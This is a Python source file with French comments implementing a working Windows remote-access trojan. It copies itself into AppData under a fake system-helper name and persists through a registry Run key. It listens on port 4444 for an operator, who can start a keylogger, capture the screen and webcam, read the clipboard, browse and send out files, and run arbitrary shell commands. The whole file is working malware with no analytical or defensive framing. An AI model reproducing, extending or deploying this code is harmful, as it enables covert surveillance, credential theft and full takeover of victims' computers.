import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time
import struct
import threading
import win32gui
import win32process
import psutil
import sys
import winreg
import ctypes
from pynput import keyboard
import json
import pyperclip
import cv2
import uuid
import shutil

# Configuration réseau
host = "0.0.0.0"
port = 4444

# Chemins pour la persistance
expected_path = os.path.join(os.getenv('APPDATA'), 'Windows Driver Foundation Helper.exe')

# Obtenir l'adresse MAC du PC
def get_mac_address():
    mac = '-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
    return mac

# Adresse MAC du PC cible
mac_address = get_mac_address()

# Fonction pour dupliquer le fichier .exe dans AppData/Roaming
def duplicate_to_appdata():
    try:
        # Obtenir le chemin complet du fichier exécutable actuel
        current_exe_path = os.path.abspath(sys.argv[0])
        print(f"[DEBUG] Chemin du fichier actuel: {current_exe_path}")
        
        # Générer le chemin de destination dans AppData/Roaming
        appdata_roaming_path = expected_path
        print(f"[DEBUG] Chemin de destination: {appdata_roaming_path}")
        
        # Vérifier si le fichier existe déjà
        if os.path.exists(appdata_roaming_path):
            print(f"[DEBUG] Le fichier existe déjà dans {appdata_roaming_path}")
            
            # Option: forcer la copie même si le fichier existe déjà
            try:
                shutil.copy2(current_exe_path, appdata_roaming_path)
                print(f"[+] Script re-copié dans {appdata_roaming_path}")
            except Exception as copy_error:
                print(f"[DEBUG] Erreur lors de la re-copie: {copy_error}")
        else:
            # Copier le fichier
            shutil.copy2(current_exe_path, appdata_roaming_path)
            print(f"[+] Script dupliqué dans {appdata_roaming_path}")
        
        # Vérifier que le fichier existe après la copie
        if os.path.exists(appdata_roaming_path):
            print(f"[DEBUG] Vérification: le fichier existe maintenant dans {appdata_roaming_path}")
        else:
            print(f"[DEBUG] ERREUR: Le fichier n'existe pas dans {appdata_roaming_path} après tentative de copie")
            
        return appdata_roaming_path
    except Exception as e:
        print(f"[!] Erreur lors de la duplication du fichier : {e}")
        return None

# Fonction pour ajouter le script au démarrage via la clé de registre
def add_to_startup(exe_path):
    try:
        key_name = "WinHelper"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print(f"[+] Ajouté au démarrage : {exe_path}")
    except Exception as e:
        print(f"[!] Erreur lors de l'ajout au démarrage : {e}")

# Keylogger
keylog_file = os.path.join(os.environ["APPDATA"], "keylog.json")
keylog_listener = None
keylog_buffer = []
last_minute = ""

if not os.path.exists(keylog_file):
    with open(keylog_file, "w", encoding="utf-8") as f:
        json.dump({}, f)

def save_keylog_buffer():
    global keylog_buffer, last_minute
    try:
        with open(keylog_file, "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
                if not isinstance(data, dict):
                    data = {}
            except:
                data = {}

        if keylog_buffer:
            current_text = data.get(last_minute, "")
            current_text += "".join(keylog_buffer)
            data[last_minute] = current_text

            with open(keylog_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

            keylog_buffer = []

    except Exception as e:
        print(f"[!] Erreur en sauvegardant le buffer : {e}")

def on_press(key):
    global keylog_buffer, last_minute
    try:
        from datetime import datetime
        now = datetime.now()
        current_minute = now.strftime("%Y-%m-%d %H:%M")

        if current_minute != last_minute:
            save_keylog_buffer()
            last_minute = current_minute

        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
        elif key == keyboard.Key.space:
            keylog_buffer.append(" ")
        elif key == keyboard.Key.enter:
            keylog_buffer.append("\n")
        elif key == keyboard.Key.backspace:
            if keylog_buffer:
                keylog_buffer.pop()
        else:
            keylog_buffer.append(f"<{key.name}>")

    except Exception as e:
        print(f"[!] Erreur keylogger: {e}")

def keylogger_thread():
    global keylog_listener
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_listener.join()

def take_screenshot():
    ip = socket.gethostbyname(socket.gethostname())
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{mac_address}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    pyautogui.screenshot().save(screenshot_path)
    return screenshot_path, filename

def take_webcam_screenshot():
    try:
        # Capture d'une image via la webcam
        cap = cv2.VideoCapture(0)  # 0 = webcam par défaut
        
        # Vérifier si la webcam est ouverte correctement
        if not cap.isOpened():
            raise Exception("Impossible d'accéder à la webcam")
            
        # Lire une image depuis la webcam
        ret, frame = cap.read()
        if not ret:
            raise Exception("Impossible de capturer une image")
            
        # Générer un nom de fichier unique
        ip = socket.gethostbyname(socket.gethostname())
        timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
        filename = f"webcam_{ip}_{mac_address}_{timestamp}.jpg"
        
        # Chemin de sauvegarde
        screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
        
        # Sauvegarder l'image
        cv2.imwrite(screenshot_path, frame)
        
        # Libérer la webcam
        cap.release()
        
        return screenshot_path, filename
        
    except Exception as e:
        print(f"[!] Erreur capture webcam: {e}")
        return None, None

def get_active_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return f"Titre: {title}\nProcessus: {process.name()}\nPID: {pid}\nExécutable: {process.exe()}"
    except Exception as e:
        return f"Erreur: {str(e)}"

def get_clipboard_content():
    try:
        return pyperclip.paste()
    except Exception as e:
        print(f"Erreur presse-papiers : {e}")
        return None

#####################################################################################################################

def list_directory(path):
    try:
        # Vérifie si le répertoire existe
        if not os.path.exists(path):
            return {"error": "Path not found"}
        
        # Liste les fichiers et dossiers
        return [{"name": f, "is_dir": os.path.isdir(os.path.join(path, f))} for f in os.listdir(path)]
    except Exception as e:
        return {"error": str(e)}
    
def send_file(conn, file_path, save_path):
    try:
        # Envoyer le fichier au client
        with open(file_path, "rb") as file:
            file_data = file.read()
            conn.sendall(struct.pack("!I", len(file_data)))  # Envoi de la taille du fichier
            conn.sendall(file_data)  # Envoi des données du fichier
        
        print(f"[+] Envoi du fichier {file_path} réussi.")
    except Exception as e:
        conn.sendall(f"[!] Erreur lors de l'envoi du fichier: {e}".encode())

def read_file(file_path):
    try:
        # Vérifie si le fichier existe
        if not os.path.exists(file_path):
            return "[!] Fichier introuvable"
        
        # Vérifie si c'est un fichier texte
        if not file_path.endswith(".txt"):
            return "[!] Ce n'est pas un fichier texte"
        
        # Lit le contenu du fichier
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
        return content
    except Exception as e:
        return f"[!] Erreur lors de la lecture du fichier: {str(e)}"

#####################################################################################################################

async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err

async def handle_client(conn):
    global keylog_listener

    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                conn.sendall(struct.pack("!I", len(data)))
                conn.sendall(filename.encode().ljust(100))
                conn.sendall(data)
                
            elif command == "WEBCAM_SCREENSHOT":
                screenshot_path, filename = take_webcam_screenshot()
                if screenshot_path:
                    with open(screenshot_path, "rb") as file:
                        data = file.read()
                    conn.sendall(struct.pack("!I", len(data)))
                    conn.sendall(filename.encode().ljust(100))
                    conn.sendall(data)
                else:
                    conn.send(b"[!] Erreur lors de la capture webcam")

            elif command == "GET_ACTIVE_WINDOW":
                info = get_active_window_info()
                conn.send(info.encode())

            elif command == "START_KEYLOG":
                if keylog_listener is None or not keylog_listener.running:
                    thread = threading.Thread(target=keylogger_thread, daemon=True)
                    thread.start()
                    conn.send(b"Keylogger started")
                else:
                    conn.send(b"Keylogger already running")

            elif command == "STOP_KEYLOG":
                if keylog_listener:
                    keylog_listener.stop()
                    keylog_listener = None
                    conn.send(b"Keylogger stopped")
                else:
                    conn.send(b"No active keylogger")

            elif command == "GET_KEYLOGS":
                save_keylog_buffer()
                if os.path.exists(keylog_file):
                    with open(keylog_file, "r", encoding="utf-8") as f:
                        data = f.read()
                    conn.sendall(data.encode())
                else:
                    conn.sendall(b"[!] Aucun fichier de log trouve.")

            elif command == "GET_CLIPBOARD":
                clipboard_content = get_clipboard_content()
                conn.send(clipboard_content.encode() if clipboard_content else b"[!] Presse-papiers vide")

            elif command.startswith("LIST_DIR"):
                path = command.split(" ", 1)[1]
                files = list_directory(path)
                conn.send(json.dumps(files).encode())

            elif command == "FILE_DOWNLOAD":
                file_path = conn.recv(1024).decode()  # Recevoir le chemin du fichier
                save_path = conn.recv(1024).decode()  # Recevoir le chemin de sauvegarde

                if os.path.exists(file_path) and os.path.isfile(file_path):
                    send_file(conn, file_path, save_path)
                else:
                    conn.sendall(b"[!] Fichier introuvable.")

            elif command.startswith("READ_FILE"):
                file_path = command.split(" ", 1)[1]
                file_content = read_file(file_path)
                conn.send(file_content.encode())
                
            else:
                result = await execute_command(command)
                conn.send(result.encode())

        except Exception as e:
            print(f"[!] Exception : {e}")
            break

    conn.close()
    print("[-] Connexion fermée")

# Fonction principale avec les mécanismes de persistance
async def main():
    # Étape 1: Duplication du fichier dans AppData
    print("[*] Tentative de duplication...")
    appdata_exe_path = duplicate_to_appdata()
    
    # Étape 2: Vérifier si le script actuel est déjà à l'emplacement attendu
    current_path = os.path.abspath(sys.argv[0])
    if current_path.lower() != expected_path.lower():
        print(f"[*] Exécution depuis {current_path}, différent de {expected_path}")
        if appdata_exe_path:
            # Lancer la version dans AppData et quitter ce processus
            print(f"[*] Lancement de {appdata_exe_path}...")
            try:
                sp.Popen([appdata_exe_path], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
                print("[+] Nouveau processus lancé avec succès")
            except Exception as e:
                print(f"[!] Erreur lors du lancement du nouveau processus: {e}")
            print("[*] Sortie du programme actuel")
            sys.exit(0)
    
    # Si on est déjà dans le bon chemin ou si la duplication a échoué, continuer
    print("[*] Exécution normale du programme")

    # Étape 4: Ajouter au démarrage via la clé de registre
    add_to_startup(expected_path)

    # Étape 5: Configurer et démarrer le serveur socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((host, port))
        s.listen(5)
        print(f"[*] En attente sur {host}:{port}")

        while True:
            conn, addr = s.accept()
            print(f"[+] Connexion de {addr[0]}")
            await handle_client(conn)
    except Exception as e:
        print(f"[!] Erreur serveur: {e}")
        s.close()

if __name__ == "__main__":
    asyncio.run(main())